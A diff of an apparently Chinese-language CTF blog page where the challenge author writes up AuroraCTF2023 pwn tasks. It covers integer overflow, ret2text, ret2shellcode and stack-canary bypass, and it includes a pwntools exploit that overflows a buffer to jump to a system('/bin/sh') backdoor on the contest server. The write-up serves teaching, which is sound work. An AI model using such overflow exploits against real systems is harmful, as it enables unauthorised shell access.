@@ -49,7 +49,7 @@
 <meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231024100812199.png">
 <meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231024100929056.png">
 <meta property="article:published_time" content="2023-10-31T02:28:19.000Z">
-<meta property="article:modified_time" content="2023-10-31T02:28:19.317Z">
+<meta property="article:modified_time" content="2023-10-31T02:34:24.278Z">
 <meta property="article:author" content="*月遇丛雲花遇風*">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -251,13 +251,13 @@
 <h2><span id="4-huan-yu-huang-zai">4.寰宇蝗灾</span><a href="#4-huan-yu-huang-zai" class="header-anchor"></a></h2><p><del>其实这道题一开始放上去的时候有个bug导致了非预期解就是在菜单的时候输入除了1和2的任意字符都可以直接爆出flag，后面检查才发现源代码有个地方循环没写好，多亏了研一师兄第一时间找到了这个bug</del></p>
 <p>考点：整数溢出</p>
 <p>IDA反汇编注意到success函数：</p>
-<img src="image-20231023115622990.png" alt="image-20231023115622990" style="zoom: 67%;">
+<img src="image-20231023115622990.png" alt="success" style="zoom: 67%;">
 
 <p>按x交叉引用知check函数调用了：</p>
-<img src="image-20231023115655969.png" alt="image-20231023115655969" style="zoom:80%;">
+<img src="image-20231023115655969.png" alt="check" style="zoom:80%;">
 
 <p>分析得check函数的传入值为负数的时候就能调用success，回到主函数观察结构</p>
-<img src="image-20231023120050449.png" alt="image-20231023120050449" style="zoom:80%;">
+<img src="image-20231023120050449.png" alt="main" style="zoom:80%;">
 
 <p>传入check的值是v5，初值为3，每轮循环会*2，v4初值为20，每轮循环中都会–，v4&#x3D;0的时候退出循环，因此推测v4控制循环次数，共执行20轮循环。</p>
 <p>我们知道，3*2^20这个数是一个正数，这并不能满足check的条件，因此需要在attack中进行操作。</p>
@@ -265,25 +265,25 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">整数溢出</span><br><span class="line">int类型数据存储方式是以补码存储的，对于32位int来说，其最高位为符号位，符号位为0的时候表示正数，符号位为1表示负数</span><br><span class="line">符号位为0时，数据表示的数就是他本身（正数），符号位为1时，其表示的实际数据为-（每一位按位取反+1）的结果</span><br><span class="line">例如：</span><br><span class="line">32位int能表示的最大正数为2^31-1，用十六进制表示即为7FFF FFFF</span><br><span class="line">二进制表示为： </span><br><span class="line">0111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111</span><br><span class="line">符号位为0，是正数</span><br><span class="line">当这个数执行+1的操作时就变为</span><br><span class="line">1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 </span><br><span class="line">即8000 0000，符号位为1，是负数，这表示的是-2^31。</span><br><span class="line">两个同符号的数相加结果变成了另一种符号，这就是发生了溢出。</span><br></pre></td></tr></table></figure>
 
 <p>可以自己写个程序验证一下</p>
-<p><img src="image-20231025193713539.png" alt="image-20231025193713539"></p>
+<p><img src="image-20231025193713539.png" alt="intoverflow"></p>
 <p>回到题目，在atack函数中</p>
-<img src="image-20231023122638914.png" alt="image-20231023122638914" style="zoom:80%;">
+<img src="image-20231023122638914.png" alt="attack" style="zoom:80%;">
 
 <p>可以输入一个int类型的数来改变虫群的数量，在这里仅对输入值&#x2F;2进行了判断，因此可以输入一个负的大数来令虫群数量溢出为负数，例如-2^32-1，由于检验的是输入值&#x2F;2，因此在一个相当大的区间内的数都是符合条件的。但是在构造大负数的时候要注意不能过大，否则输入数本身就溢出为负数，这时候前面加个负号就从负数变为一个很大的正数，这样就不满足条件了。</p>
-<p><img src="image-20231023123214264.png" alt="image-20231023123214264"></p>
+<p><img src="image-20231023123214264.png" alt="success"></p>
 <h2><span id="5-you-you-zi-de-shi-wu">5.幽幽子的食物</span><a href="#5-you-you-zi-de-shi-wu" class="header-anchor"></a></h2><p>ret2text</p>
 <p>查看保护：</p>
-<p><img src="image-20231023132127507.png" alt="image-20231023132127507"></p>
+<p><img src="image-20231023132127507.png" alt="checksec"></p>
 <p>没有开canary，说明可以直接进行溢出</p>
 <p>在IDA反汇编后发现有后门函数</p>
-<p><img src="image-20231023172115519.png" alt="image-20231023172115519"></p>
+<p><img src="image-20231023172115519.png" alt="gift"></p>
 <p>主函数：</p>
-<p><img src="image-20231023172129483.png" alt="image-20231023172129483"></p>
+<p><img src="image-20231023172129483.png" alt="main"></p>
 <p>在s中可读入0x100大小，肯定能溢出。</p>
 <p>双击s查看栈结构：</p>
-<p><img src="image-20231023172222483.png" alt="image-20231023172222483"></p>
+<p><img src="image-20231023172222483.png" alt="stack_of_main"></p>
 <p>要进行溢出，需要填充0x30（s的大小） + 0x8（rbp）字节的字符，然后再发送目标后门地址。</p>
-<p><img src="image-20231023172331057.png" alt="image-20231023172331057"></p>
+<p><img src="image-20231023172331057.png" alt="backdoor"></p>
 <p>在汇编界面找到后门函数执行system(“&#x2F;bin&#x2F;sh”)的地方，溢出后返回到这里，由于栈对齐的影响返回到gift函数开头可能无法成功getshell，比较保险的方法是直接跳转到这里。</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># sh = process([&#x27;./pwn&#x27;])</span></span><br><span class="line">sh = remote(<span class="string">&#x27;actf-node.szu.moe&#x27;</span>, <span class="number">10077</span>)</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x4011ac</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(backdoor_addr)</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;Can you find it?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -299,10 +299,10 @@
 <p>参考ctfwiki：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode</a></p>
 <p>回到本题，让我们先看看这道题的结构</p>
 <p>查看保护：</p>
-<p><img src="image-20231023173247783.png" alt="image-20231023173247783"></p>
+<p><img src="image-20231023173247783.png" alt="checksec"></p>
 <p>全关了</p>
 <p>看IDA反汇编：</p>
-<p><img src="image-20231023173102886.png" alt="image-20231023173102886"></p>
+<p><img src="image-20231023173102886.png" alt="main"></p>
 <p>首先输出了buf的地址，然后可以在buf写入最多0x20字节，然后对v5进行read，显然在v5处是可以直接溢出的。</p>
 <p>这题没有了后门函数，因此就需要用到前面的buf。</p>
 <p>根据上面的简介我们已经了解shellcode可以让机器执行指定的命令从而getshell，在本题而言，由于没有开NX保护，可以直接在buf处写入合适长度的shellcode，然后在后面栈溢出返回到buf处即可。</p>
@@ -320,17 +320,17 @@
 <p>64位程序canary的位置一般位于rbp-8的位置，在程序返回之前，会先比较栈上canary的值和保存的canary值是否相同，如果不同，说明发生了栈溢出，将会跳转到__stack_chk_fail函数，然后程序就会寄掉。</p>
 <p>那要绕过canary保护其实也很简单，首先泄露canary，然后在构造payload的时候，在canary的位置把泄露出来的canary填回去就能绕过检测，正常执行栈溢出。</p>
 <p>本题开启了canary保护的栈结构如下图所示：</p>
-<img src="image-20231024100618935.png" alt="image-20231024100618935" style="zoom:80%;">
+<img src="image-20231024100618935.png" alt="canary" style="zoom:80%;">
 
 <p>那么可以看到其中var_8对应的就是canary。</p>
 <p>可以看到有后门函数：</p>
-<img src="image-20231024100722147.png" alt="image-20231024100722147" style="zoom:80%;">
+<img src="image-20231024100722147.png" alt="gift" style="zoom:80%;">
 
 <p>但是需要用到srcret，那么secret是什么呢，我们可以双击查看</p>
-<p><img src="image-20231024100812199.png" alt="image-20231024100812199"></p>
+<p><img src="image-20231024100812199.png" alt="secret"></p>
 <p>可以看到secret是bss段的一个全局变量。</p>
 <p>至此思路基本已经清晰了，那就是绕过canary溢出返回到后门函数，并想办法将secret修改成&#x2F;bin&#x2F;sh</p>
-<p><img src="image-20231024100929056.png" alt="image-20231024100929056"></p>
+<p><img src="image-20231024100929056.png" alt="main"></p>
 <p>在主函数中我们可以看到Login success后会直接将栈上信息整个输出，由于printf字符串会在遇到\x00截断，因此直接输出是无法泄露canary的。</p>
 <p><del>那么如何泄露canary呢，这里留个悬念，剩下的流程看下面的exp可以思考下为什么。不会再来摇我（</del></p>
 <p>exp: </p>
@@ -387,7 +387,7 @@
   
         </div>
         <footer class="article-footer">
-            <a data-url="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/" data-id="clodpmhnt000dskugb06fc2ti" data-title="记第一次出Pwn题——AuroraCTF2023第一批Pwn"
+            <a data-url="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/" data-id="clodq7id0000e14ug0x2i2jnc" data-title="记第一次出Pwn题——AuroraCTF2023第一批Pwn"
                class="article-share-link">分享</a>
             
             
@@ -402,12 +402,28 @@
         
     <nav id="article-nav" class="wow fadeInUp">
         
+            <div class="article-nav-link-wrap article-nav-link-left">
+                
+                    
+                    
+                        <img data-src="/covers/72235081_p0_master1200.jpg" data-sizes="auto" alt="使用docker部署pwn题" class="lazyload">
+                    
+                
+                <a href="/2023/10/31/%E4%BD%BF%E7%94%A8docker%E9%83%A8%E7%BD%B2pwn%E9%A2%98/"></a>
+                <div class="article-nav-caption">前一篇</div>
+                <h3 class="article-nav-title">
+                    
+                        使用docker部署pwn题
+                    
+                </h3>
+            </div>
+        
         
             <div class="article-nav-link-wrap article-nav-link-right">
                 
                     
                     
-                        <img data-src="/covers/QQ图片20221124115312.jpg" data-sizes="auto" alt="hexo添加版权声明" class="lazyload">
+                        <img data-src="/covers/QQ图片20211219112951.jpg" data-sizes="auto" alt="hexo添加版权声明" class="lazyload">
                     
                 
                 <a href="/2023/10/30/hexo%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E/"></a>
@@ -447,7 +463,7 @@
         <div class="sidebar-state">
             <div class="sidebar-state-article">
                 <div>文章</div>
-                <div class="sidebar-state-number">7</div>
+                <div class="sidebar-state-number">8</div>
             </div>
             <div class="sidebar-state-category">
                 <div>分类</div>
@@ -455,7 +471,7 @@
             </div>
             <div class="sidebar-state-tag">
                 <div>标签</div>
-                <div class="sidebar-state-number">6</div>
+                <div class="sidebar-state-number">7</div>
             </div>
         </div>
         <div class="sidebar-social">
@@ -508,7 +524,7 @@
     <div class="widget-wrap wow fadeInRight">
         <h3 class="widget-title">标签云</h3>
         <div class="widget tagcloud">
-            <a href="/tags/SSH%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">SSH连接</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hexo/" style="font-size: 20px;">hexo</a> <a href="/tags/openGL/" style="font-size: 10px;">openGL</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
+            <a href="/tags/SSH%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">SSH连接</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hexo/" style="font-size: 20px;">hexo</a> <a href="/tags/openGL/" style="font-size: 10px;">openGL</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a>
         </div>
     </div>
 
@@ -548,10 +564,10 @@
             
                 <div>
                     <span class="icon-brush"></span>
-                    8.6k
+                    10.1k
                     &nbsp;|&nbsp;
                     <span class="icon-coffee"></span>
-                    00:34
+                    00:40
                 </div>
             
             
@@ -578,7 +594,7 @@
         <div class="sidebar-state">
             <div class="sidebar-state-article">
                 <div>文章</div>
-                <div class="sidebar-state-number">7</div>
+                <div class="sidebar-state-number">8</div>
             </div>
             <div class="sidebar-state-category">
                 <div>分类</div>
@@ -586,7 +602,7 @@
             </div>
             <div class="sidebar-state-tag">
                 <div>标签</div>
-                <div class="sidebar-state-number">6</div>
+                <div class="sidebar-state-number">7</div>
             </div>
         </div>
         <div class="sidebar-social">
